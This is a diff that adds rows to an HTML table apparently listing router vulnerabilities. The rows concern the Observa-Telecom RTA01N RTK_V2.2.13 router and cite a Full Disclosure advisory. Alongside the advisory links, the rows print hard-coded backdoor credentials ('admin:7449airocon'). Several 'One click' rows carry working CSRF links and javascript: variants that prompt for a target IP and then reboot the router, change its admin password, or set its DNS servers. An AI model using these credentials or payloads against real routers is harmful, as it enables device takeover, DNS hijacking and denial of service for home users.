@@ -269,6 +269,216 @@
         </tfoot>
  
         <tbody>
+		<tr>
+          <td>
+           2015/05/28
+          </td>
+          <td>
+           <a href="/Observa-Telecom">
+            Observa-Telecom
+           </a>
+          </td>
+          <td>
+           Advisory
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+            seclists.org
+           </a>
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+            RTA01N RTK_V2.2.13 Universal Plug and Play</a>
+          </td>
+          <td>
+           Universidad Europea de Madrid
+          </td>
+         </tr>
+		<tr>
+          <td>
+           2015/05/28
+          </td>
+          <td>
+           <a href="/Observa-Telecom">
+            Observa-Telecom
+           </a>
+          </td>
+          <td>
+           Advisory
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+            seclists.org
+           </a>
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+            RTA01N RTK_V2.2.13 Backdoor admin:7449airocon</a>
+          </td>
+          <td>
+           Universidad Europea de Madrid
+          </td>
+         </tr>
+		<tr>
+          <td>
+           2015/05/28
+          </td>
+          <td>
+           <a href="/Observa-Telecom">
+            Observa-Telecom
+           </a>
+          </td>
+          <td>
+           Advisory
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+            seclists.org
+           </a>
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+            RTA01N RTK_V2.2.13 Backdoor admin:7449airocon</a>
+          </td>
+          <td>
+           Universidad Europea de Madrid
+          </td>
+         </tr>
+		<tr>
+          <td>
+           2015/05/28
+          </td>
+          <td>
+           <a href="/Observa-Telecom">
+            Observa-Telecom
+           </a>
+          </td>
+          <td>
+           Advisory
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+            seclists.org
+           </a>
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+            RTA01N RTK_V2.2.13 Unauthenticated Cross-site Scripting (XSS)</a>
+          </td>
+          <td>
+           Universidad Europea de Madrid
+          </td>
+         </tr>
+		<tr>
+          <td>
+           2015/05/28
+          </td>
+          <td>
+           <a href="/Observa-Telecom">
+            Observa-Telecom
+           </a>
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+            seclists.org
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/form2Reboot.cgi?rebootMode=0&reboot=%22Reiniciar%22&submit.htm?reboot.htm=%22Send%22">
+            RTA01N RTK_V2.2.13 CSRF Denial of Service</a>
+	           <a href="javascript:document.location='http://'+prompt('IP')+'/form2Reboot.cgi?rebootMode=0&reboot=%22Reiniciar%22&submit.htm?reboot.htm=%22Send%22'">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Universidad Europea de Madrid
+          </td>
+         </tr>
+		<tr>
+          <td>
+           2015/05/28
+          </td>
+          <td>
+           <a href="/Observa-Telecom">
+            Observa-Telecom
+           </a>
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+            seclists.org
+           </a>
+          </td>
+          <td>
+			<a href='http://192.168.1.1/form2userconfig.cgi?username=%221234%22&privilege=2&oldpass=%221234%22&newpass=%22newpass%22&confpass=%22newpass%22&modify=%22Modificar%22&select=%22s0%22&hiddenpass=%221234%22&submit.htm?userconfig.htm=%22Send%22'>
+            RTA01N RTK_V2.2.13 CSRF change password from 1234 (default) to newpass</a>
+	           <a href="javascript:document.location='http://'+prompt('IP')+'/form2userconfig.cgi?username=1234&privilege=2&oldpass=1234&newpass='+prompt('New password')+'&confpass='+prompt('Confirm new password')+'&modify=Modificar&select=s0&hiddenpass=1234&submit.htm?userconfig.htm=Send'">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Universidad Europea de Madrid
+          </td>
+         </tr>
+		<tr>
+          <td>
+           2015/05/28
+          </td>
+          <td>
+           <a href="/Observa-Telecom">
+            Observa-Telecom
+           </a>
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+            seclists.org
+           </a>
+          </td>
+          <td>
+			<a href="javascript:document.location='http://192.168.1.1/form2Dns.cgi?dnsMode=%221%22&dns1=%22'+prompt('DNS1')+'%22&dns2=%22'+prompt('DNS2')+'%22&dns3=%22%22&submit.htm?dns.htm=%22Send%22&save=%22Aplicar'">
+            RTA01N RTK_V2.2.13 CSRF change DNS servers</a>
+	           <a href="javascript:document.location='http://'+prompt('IP')+'/goform/formDNS?dnsMode=dnsManual&dns1='+prompt('DNS')+'&dns2=&dns3='">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Universidad Europea de Madrid
+          </td>
+         </tr>
+		<tr>
+          <td>
+           2015/05/28
+          </td>
+          <td>
+           <a href="/Observa-Telecom">
+            Observa-Telecom
+           </a>
+          </td>
+          <td>
+           Advisory
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+            seclists.org
+           </a>
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+            RTA01N RTK_V2.2.13 Multiple Cross-site Scriptings (XSS)</a>
+           </a>
+          </td>
+          <td>
+           Universidad Europea de Madrid
+          </td>
+         </tr>
 <tr>
           <td>
            2015/05/28
